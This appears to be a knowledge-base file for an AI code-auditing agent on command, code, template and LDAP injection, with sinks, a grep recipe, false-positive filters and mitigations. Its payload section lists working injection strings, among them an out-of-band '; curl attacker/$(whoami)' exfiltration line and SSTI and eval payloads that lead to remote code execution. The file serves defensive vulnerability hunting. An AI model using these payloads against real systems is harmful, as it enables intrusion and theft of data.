---
name: sh-kb-injection
description: "Knowledge base for finding command/OS injection, template injection (SSTI), code injection (eval), and LDAP/NoSQL/expression injection. Use when hunting injection into shells, template engines, interpreters, or directory queries. CWE-77/78/94/917, OWASP A03:2021-Injection."
---

# Command / Code / Template Injection - Hunter Knowledge Base

Attacker input is interpreted as an OS command, program code, template expression, or query language.
Frequently yields remote code execution - treat confirmed cases as critical.

## Sub-classes & sinks
### OS command injection (CWE-78)
- **Python**: `os.system`, `subprocess.*(..., shell=True)`, `os.popen`, `commands.getoutput`.
- **JS/TS**: `child_process.exec`, `execSync`, `spawn(cmd, {shell:true})`, backtick shell libs.
- **Java**: `Runtime.exec(String)`, `ProcessBuilder` with a shell string. **PHP**: `system`, `exec`,
  `shell_exec`, `passthru`, backticks, `popen`, `proc_open`. **Go**: `exec.Command("sh","-c",str)`.
- **Ruby**: backticks, `system`, `%x[]`, `Open3` with a shell string.
Danger: user data concatenated into the command string; shell metacharacters `; | & $() \`\` > <` not neutralized.

### Code / eval injection (CWE-94/95)
`eval`, `exec`, `Function(`, `setTimeout(str)`, `vm.runInContext`, `pickle`/`yaml.load` (see deserialization),
PHP `eval`/`assert`/`create_function`, Ruby `eval`/`instance_eval`/`send(userStr)`.

### Server-Side Template Injection (SSTI, CWE-1336)
User input concatenated into a template *before* compilation: Jinja2 `Template(userStr).render()`,
`render_template_string(user)`, Twig, Freemarker, Velocity, Handlebars, ERB `ERB.new(user)`, Thymeleaf
expressions, Go `text/template` parsing user strings. (Passing user data as a *context variable* is safe;
compiling user data as the *template* is not.)

### LDAP / expression / NoSQL injection
LDAP filters built by concat (CWE-90): `(&(uid=<user>)...)`. NoSQL `$where`, operator injection (see sqli
cheatsheet). SpEL/OGNL/MVEL expression eval on user input (CWE-917).

## Detection recipe
1. `graft grep "shell=True|child_process|Runtime.exec|shell_exec|render_template_string|\beval\(|ProcessBuilder|exec.Command" --json`.
2. Trace the command/template/expression argument to an untrusted source.
3. Check for argument-vector usage (safe: `subprocess.run(["ls", arg])` without shell) vs shell string (unsafe).

## Payloads / PoC
- Command: `; id`, `| id`, `$(id)`, `` `id` ``, `& ping -c1 attacker`, newline `%0a id`. OOB: `; curl attacker/$(whoami)`.
- SSTI (Jinja2): `{{7*7}}` -> `49` confirms; escalate `{{ ''.__class__.__mro__[1].__subclasses__() }}` ... RCE gadget.
- SSTI (Freemarker): `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- eval (JS): `1;process.mainModule.require('child_process').execSync('id')`.
- LDAP: `*)(uid=*))(|(uid=*` for auth bypass / enumeration.

## False-positive filters
- **Argument vector, no shell**: list-form `subprocess.run([...])`, `execFile`, `spawn` without `shell:true`,
  `ProcessBuilder` with separate args - arguments can't inject commands.
- Input strictly validated/allowlisted (enum of allowed commands), or a numeric/enum type.
- Template compiled from a **constant**; user data only supplied as bound context variables.
- Fully hardcoded command with no user data.

## CWE / OWASP / severity
CWE-77/78 (command), CWE-94 (code), CWE-1336 (SSTI), CWE-90 (LDAP), CWE-917 (expression). OWASP A03:2021.
Confirmed RCE -> **critical**; blind/limited -> high.

## Chaining hints
Any of these -> RCE -> read `secrets`/env -> lateral movement; SSTI often escalates from a reflected value;
LDAP injection -> `auth` bypass. RCE is usually a chain terminus (full compromise).

## Mitigation
Avoid shells: use argument-vector APIs (no `shell=True`). Never `eval` user input. Never compile templates
from user input; pass data as context only. Parameterize/escape LDAP filters. Allowlist where a set of
commands is genuinely needed. Run with least privilege and in a sandbox/container.
